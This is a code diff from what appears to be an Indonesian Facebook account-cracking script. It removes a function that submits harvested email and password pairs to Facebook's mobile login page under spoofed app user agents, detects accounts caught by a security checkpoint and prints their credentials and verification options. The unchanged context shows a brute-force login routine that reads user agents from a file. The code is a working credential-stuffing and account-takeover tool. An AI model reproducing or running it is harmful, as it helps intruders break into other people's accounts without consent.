@@ -1,6 +1,5 @@
 #!/usr/bin/python3
 #-*-coding:utf-8-*-
-# Made With ❤️ By Dapunta
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json
 from random import randint
@@ -731,73 +730,6 @@ def check_ugent():
     input(k+"\n[ "+p+"Back"+k+" ]"+p)
     menu()
    
-###CEK SESI###   
-   
-def cek_sesi():
-	with requests.Session() as ses_dev:
-		hal = ses_dev.get("https://mbasic.facebook.com/login").content
-		sop = BeautifulSoup(hal, "html.parser")
-		form = sop.find("form", id="login_form")
-		url_post = form["action"]
-		payload = {}
-		for dev in form:
-			input = dev
-			payload[input.get("name")]=input.get("value")
-		payloads = {
-					"lsd": str(payload["lsd"]),
-					"jazoest": str(payload["jazoest"]),
-					"m_ts": str(payload["m_ts"]),
-					"li": str(payload["li"]),
-					"try_number": str(payload["try_number"]),
-					"unrecognized_tries": str(payload["unrecognized_tries"]),
-					"email": str(user_),
-					"pass": str(pas_),
-					"bi_xrwh": str(payload["bi_xrwh"])
-					}
-		header = {
-					"user-agent": "Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]",
-					# "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]",
-					# "user_agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
-					"Host":"mbasic.facebook.com",
-					"cache-control":"max-age=0",
-					"upgrade-insecure-requests":"1",
-					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-					"accept-encoding":"gzip, deflate",
-					"content-length": str(random.randint(100, 200)),
-					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-				}
-		respons = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payloads, headers=header)
-		if "checkpoint" in respons.cookies:
-	
-			sop_ = BeautifulSoup(respons.content, "html.parser")
-			form = sop_.find("form")
-			url_post = form["action"]
-			nh = sop_.find("input", attrs={"name": "nh"})["value"]
-			payloads = {}
-			for dev in form:
-				input = dev
-				payloads[input.get("name")] = input.get("value")
-
-			payloads.update({"submit[Continue]": "Lanjutkan", "nh": nh})
-			respon_ = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payloads)
-			if "checkpointSecondaryButton" in respon_.text:
-				print "AkunTapyesssssss+++++++++++++++"
-				print h+" Akun Tap Yess...\n "+user_+p+" | "+h+pas_
-
-			sop = BeautifulSoup(respon_.content, "html.parser")
-			select_dev = sop.find("select", attrs={"name": "verification_method"})
-			c = 1
-			option_ = []
-			sesi_ttl = []
-			for dev in select_dev.find_all("option"):
-				if c >= 2:
-					option_.append("\n"+p+"    |_"+str(c)+k+" "+dev.text)
-				else:
-					option_.append("\n"+p+"    \\_"+str(c)+k+" "+dev.text)
-			print data_hasil+k+"\n    >>>"+h+" Opsi Sesi"+"".join(option_)
-			menu()
-
-### BRUTE CRACK ###
 
 def mbasic(em,pas,hosts):
 	ua = open('ugent.txt', 'r').read()
